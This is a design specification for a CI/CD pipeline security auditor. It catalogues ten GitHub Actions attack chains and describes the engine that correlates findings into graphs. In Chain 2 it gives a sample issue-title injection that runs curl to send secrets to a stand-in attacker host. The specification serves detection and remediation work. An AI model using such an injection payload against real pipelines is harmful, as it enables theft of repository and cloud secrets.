# Attack Chains and Threat Models (Phase 3 Specification)

Isolated static analysis findings often present moderate risk when viewed in isolation. However, in modern CI/CD pipelines, sophisticated attackers chain disparate misconfigurations across workflow lifecycles to achieve catastrophic compromise—such as arbitrary remote code execution (RCE) in runner environments, secret harvesting, repository write takeover, and cloud infrastructure pivoting.

The **CI/CD Pipeline Security Auditor** features a declarative, data-driven Attack Chain Correlation Engine that bridges discrete static rules into multi-stage attack paths represented as directed graphs compatible with Cytoscape.js.

---

## 1. Catalog of the 10 Attack Chains

### Chain 1: Pwn-Request (`pwn-request`)
- **Category**: Privilege Escalation / Remote Code Execution
- **Trigger**: `pull_request_target` event
- **Required Findings**: `R003` (`pr-target-checkout`)
- **Secondary Findings**: `R002` (`excessive-permissions`), `R004` (`script-injection`), `missing-timeout`
- **Context Predicate**: Workflow executes on `pull_request_target` and the job possesses elevated write permissions or reachable secrets (`has_write_permissions or has_secrets_reachable or has_finding("R002")`).
- **Threat Narrative**: `pull_request_target` triggers in the security context of the base repository (granting access to write tokens and repository secrets). Checking out the pull request head SHA (`ref: ${{ github.event.pull_request.head.sha }}`) pulls untrusted, unreviewed code from an attacker-controlled fork. Subsequent build commands or test scripts (`npm test`, `make`) execute attacker code with the base repository's write token, resulting in unauthorized commits, release tampering, or secret theft.
- **Graph Flow**: `Untrusted PR Event` -> `R003: Head Checkout` -> `Elevated Write Permissions` -> `Base Repository Compromise`.

### Chain 2: Injection to Exfiltration (`injection-to-exfil`)
- **Category**: Command Injection / Credential Theft
- **Trigger**: Untrusted event payloads (`issues`, `pull_request`, `discussion`, `workflow_dispatch`)
- **Required Findings**: `R004` (`script-injection`)
- **Secondary Findings**: `R002`, `R005` (`plaintext-secret`), `R006` (`secret-in-log`), `R007` (`long-lived-credentials`), `permissions-overbroad-job`
- **Context Predicate**: Untrusted input is interpolated into shell commands in a job scope where repository secrets are reachable (`has_secrets_reachable`).
- **Threat Narrative**: Untrusted context expressions (such as issue titles, PR bodies, or branch names) are dynamically substituted inside a `run:` step via `${{ ... }}` before the shell interpreter launches. An adversary submits an issue titled `bug"; curl -d @- https://attacker.com < /tmp/env #`, which breaks out of the shell command and exfiltrates runtime secrets (`REPO_SECRET`, `AWS_SECRET_KEY`) to an external adversary server.
- **Graph Flow**: `Issue/PR Payload` -> `R004: Script Injection` -> `Reachable Secrets in Job Scope` -> `Credential Exfiltration`.

### Chain 3: Supply-Chain Takeover (`supply-chain-takeover`)
- **Category**: Software Supply Chain Compromise
- **Trigger**: Automated workflow runs (`push`, `schedule`)
- **Required Findings**: `R001` (`unpinned-action-tag`) AND `R010` (`third-party-action`)
- **Secondary Findings**: `R002`, `permissions-overbroad-job`, `persist-credentials`, `secret-to-unpinned-action`
- **Context Predicate**: The job runs with write permissions or accessible credentials (`has_write_permissions or has_finding("R002") or has_secrets_reachable`).
- **Threat Narrative**: The pipeline invokes a third-party GitHub Action referenced by a mutable git tag (e.g. `@v2`) or branch name (e.g. `@main`). If the action author's account is hijacked or the tag is updated upstream to point to a malicious commit, the action executes arbitrary code inside the victim's CI/CD pipeline, inheriting repository write tokens and injecting backdoors into build artifacts or releases.
- **Graph Flow**: `Workflow Run` -> `R001/R010: Unpinned Third-Party Action` -> `Repository Write Permissions` -> `Backdoored Artifacts & Releases`.

### Chain 4: Deploy Blast Radius (`deploy-blast-radius`)
- **Category**: Pipeline Integrity & Deployment Risk
- **Trigger**: Direct commit, branch push, or automated trigger
- **Required Findings**: `R008` (`deploy-environment`)
- **Secondary Findings**: `R007` (`long-lived-credentials`), `R001`, `R002`
- **Context Predicate**: The deployment job lacks environment protection gates and accesses long-lived credentials (`has_finding("R007") or has_secrets_reachable`).
- **Threat Narrative**: A deployment job communicates directly with production cloud infrastructure without specifying an `environment:` block with required reviewer approvals or deployment branch restrictions. Using long-lived static credentials (e.g., AWS IAM keys), any unauthorized branch push or unreviewed merge directly updates production infrastructure without human verification or audit gates.
- **Graph Flow**: `Branch Push` -> `R008: Missing Environment Protection` -> `Long-Lived Static Cloud Credentials` -> `Unauthorized Production Deployment`.

### Chain 5: Runner Persistence (`runner-persistence`)
- **Category**: Infrastructure Compromise / Lateral Movement
- **Trigger**: Untrusted triggers (`pull_request`, `pull_request_target`, `issues`, `fork`)
- **Required Findings**: `R009` (`self-hosted-runner`)
- **Secondary Findings**: `R002`, `R004`
- **Context Predicate**: Workflow executes on an untrusted trigger (`has_untrusted_trigger`).
- **Threat Narrative**: A persistent, non-ephemeral `self-hosted` runner executes jobs initiated by public or untrusted contributors. An attacker submits a pull request containing malicious code that installs a persistent backdoor, compromises the runner daemon process, accesses adjacent internal networks, or harvests credentials from previous builds across runs.
- **Graph Flow**: `Untrusted PR Trigger` -> `R009: Self-Hosted Runner` -> `Persistent Host Daemon State` -> `Host Takeover & Lateral Network Pivoting`.

### Chain 6: Artifact Poisoning (`artifact-poisoning`)
- **Category**: Multi-Stage Workflow Escalation
- **Trigger**: `workflow_run` event
- **Required Findings**: `workflow-run-untrusted-artifact` (R17)
- **Secondary Findings**: `R002`, `permissions-overbroad-job`
- **Context Predicate**: Privileged execution context holds write permissions or secrets (`has_write_permissions or has_secrets_reachable or has_finding("R002")`).
- **Threat Narrative**: To bypass pull request permission limits, repositories often trigger a secondary privileged workflow via `workflow_run` upon completion of a PR check. This privileged workflow downloads an unverified build artifact produced by the untrusted fork. If the privileged workflow unpacks and executes code from this artifact, the untrusted PR author escalates privileges to the base repository.
- **Graph Flow**: `workflow_run Trigger` -> `R17: Untrusted Artifact Download` -> `Privileged Base Repo Tokens` -> `Privilege Escalation & RCE`.

### Chain 7: Comment Trigger Takeover (`comment-trigger-takeover`)
- **Category**: Authorization Bypass / Bot Hijacking
- **Trigger**: `issue_comment`, `pull_request_review_comment`
- **Required Findings**: `comment-trigger-no-auth` (R18)
- **Secondary Findings**: `R004`, `R002`, `permissions-overbroad-job`
- **Context Predicate**: Job lacks authorization checks while executing commands or holding write tokens (`has_finding("R004") or has_write_permissions or has_secrets_reachable`).
- **Threat Narrative**: A "ChatOps" workflow triggers on new issue comments to run slash commands (e.g. `/deploy`, `/test`). The workflow fails to verify that `github.event.comment.author_association` is `OWNER`, `MEMBER`, or `COLLABORATOR`. Any external GitHub user can comment on a public issue to trigger privileged automation, deploy malicious code, or trigger script injection.
- **Graph Flow**: `issue_comment Event` -> `R18: Missing Author Association Check` -> `Write Token & Bot Execution Context` -> `Unauthorized Automation Execution`.

### Chain 8: Credential Persistence (`credential-persistence`)
- **Category**: Local Token Exposure / Action Bleed
- **Trigger**: Workflow checkout execution
- **Required Findings**: `persist-credentials` (R11)
- **Secondary Findings**: `R010`, `R001`, `artifact-leak`
- **Context Predicate**: Checkout leaves credentials on disk followed by third-party actions or artifact uploads (`has_finding("R010") or has_finding("R001") or has_finding("artifact-leak")`).
- **Threat Narrative**: `actions/checkout` defaults to storing the temporary `GITHUB_TOKEN` in `.git/config` on disk. When subsequent steps in the same job invoke unpinned third-party actions or upload the workspace via `actions/upload-artifact`, the stored token is exposed to action authors or external artifact downloaders.
- **Graph Flow**: `Checkout Step` -> `R11: Default Credential Persistence` -> `Stored GITHUB_TOKEN in .git/config` -> `Credential Harvesting by Third-Party Action`.

### Chain 9: Cache Poisoning Escalation (`cache-poisoning-escalation`)
- **Category**: Build Artifact Tampering / Cache Poisoning
- **Trigger**: Privileged release or deployment workflow
- **Required Findings**: `cache-poisoning-risk` (R25)
- **Secondary Findings**: `R008`, `R002`, `permissions-overbroad-job`
- **Context Predicate**: Cache is used in a deployment, release, or privileged job (`is_deploy_like or has_secrets_reachable or has_write_permissions`).
- **Threat Narrative**: Dependency caches (e.g. `actions/cache`) share key namespaces across branches. An attacker creates a branch with poisoned dependencies under a matching cache key. When the release or deployment workflow executes, it restores the poisoned cache, injecting malicious binaries directly into official release packages.
- **Graph Flow**: `Release/Deploy Workflow` -> `R25: Cache Poisoning Risk` -> `Shared Cache Key Namespace` -> `Malicious Release Package Injected`.

### Chain 10: OIDC Abuse (`oidc-abuse`)
- **Category**: Cloud Federation Takeover
- **Trigger**: Untrusted event or unpinned action context
- **Required Findings**: `oidc-write-untrusted` (R26)
- **Secondary Findings**: `R001`, `R010`, `R004`, `R008`
- **Context Predicate**: OIDC tokens are requested in an unpinned or untrusted execution context (`has_finding("R001") or has_finding("R010") or has_finding("R004") or has_untrusted_trigger`).
- **Threat Narrative**: A workflow configures OpenID Connect (`id-token: write`) to assume roles in AWS, GCP, or Azure without long-lived keys. However, if the job executes an unpinned third-party action or runs on untrusted PR triggers, malicious code can intercept the OIDC token exchange (`ACTIONS_ID_TOKEN_REQUEST_URL` / `ACTIONS_ID_TOKEN_REQUEST_TOKEN`) to assume cloud IAM roles directly.
- **Graph Flow**: `Untrusted Trigger / Action` -> `R26: Untrusted OIDC Token Minting` -> `Cloud IAM Federation (id-token: write)` -> `Cloud Account Compromise & IAM Assume-Role`.

---

## 2. Correlation Engine Architecture

```
                          Workflow AST & Findings
                                     │
                                     ▼
                        ┌────────────────────────┐
                        │   JobContext Builder   │
                        │ (Triggers, Perms, Env) │
                        └────────────┬───────────┘
                                     │
                ┌────────────────────┴────────────────────┐
                ▼                                         ▼
      Required Rule Matching                    Predicate Evaluation
   (e.g., R003 present in job)              (e.g., has_pr_target & write)
                │                                         │
                └────────────────────┬────────────────────┘
                                     │
                                     ▼
                         ┌───────────────────────┐
                         │   Chain Instantiation │
                         │ (Nodes, Edges, Story) │
                         └───────────┬───────────┘
                                     │
                ┌────────────────────┴────────────────────┐
                ▼                                         ▼
         Attack Chains                           Standalone Findings
     (Exported to Cytoscape)                    (Uncorrelated Risks)
```

### Scoping Rules
1. **Same-Job Scoping (Primary Boundary)**:
   Findings must coexist in the **same job** to form an attack chain. For example, if Job A has a script injection vulnerability (`R004`) but Job B contains repository secrets, the correlation engine will **not** combine them into `injection-to-exfil` because the execution contexts and environment variables are strictly isolated across GitHub Actions runner VMs.
2. **Workflow-Level Context Inheritance**:
   Workflow-level configurations (e.g. top-level `permissions:`, top-level `on:` triggers, and top-level `env:`) apply to all jobs within that workflow. Findings emitted at workflow level (`job is None`) are inherited by every job's `JobContext`.
3. **Multi-Chain Membership**:
   A single finding can legitimately participate in multiple attack chains if distinct attack conditions are satisfied. For example, `R002` (excessive write permissions) can participate in both `pwn-request` and `supply-chain-takeover`.
4. **Standalone Findings Isolation**:
   Findings that do not meet the multi-stage criteria of any attack chain are preserved in `standalone_findings`. They remain fully visible in the UI and report as discrete security concerns.

---

## 3. Cytoscape.js Graph Schema

Every attack chain generates a directed acyclic graph (DAG) exported via `AttackGraph.to_cytoscape_elements()` conforming to Cytoscape.js JSON specifications:

### Node Structure
```json
{
  "data": {
    "id": "c-001-vuln-R003-11",
    "label": "R003: Dangerous PR Head Checkout in pull_request_target",
    "category": "misconfiguration",
    "finding_id": "f-r003-0001",
    "rule_id": "R003",
    "job": "pwn_target_job",
    "line": 11,
    "severity": "CRITICAL"
  }
}
```

### Edge Structure
```json
{
  "data": {
    "id": "c-001-e1",
    "source": "c-001-trigger",
    "target": "c-001-vuln-R003-11",
    "label": "triggers"
  }
}
```

### 4-Tier Node Categories
1. `trigger`: Entry vector (e.g. `pull_request_target`, `issue_comment`, `workflow_run`).
2. `misconfiguration`: The static vulnerability detected in workflow syntax (e.g. unpinned action, unescaped interpolation).
3. `privilege`: Security boundary or credential reached (e.g. write token, repository secret, runner daemon).
4. `impact`: The high-severity business or infrastructure consequence (e.g. cloud account takeover, repository compromise).

---

## 4. Viva Defensibility (Academic Evaluation)

### Why Correlation is Superior to Isolated Linting
Standard linters (like Actionlint or Checkov) output flat lists of warnings without contextual awareness. In practice, a development team receiving 50 flat alerts suffers from **alert fatigue**.
By correlating findings into **Attack Chains**:
1. **Explainable Threat Pathways**: The auditor demonstrates *how* an external threat actor moves from trigger to payload execution to credential harvesting.
2. **False Positive Suppression**: If a job has an injection risk (`R004`) but possesses zero secrets and read-only permissions, it does not elevate to a critical exfiltration attack chain.
3. **Targeted Remediation**: Breaking a single link in the chain (e.g. adding `persist-credentials: false` or setting `permissions: contents: read`) breaks the entire attack graph.
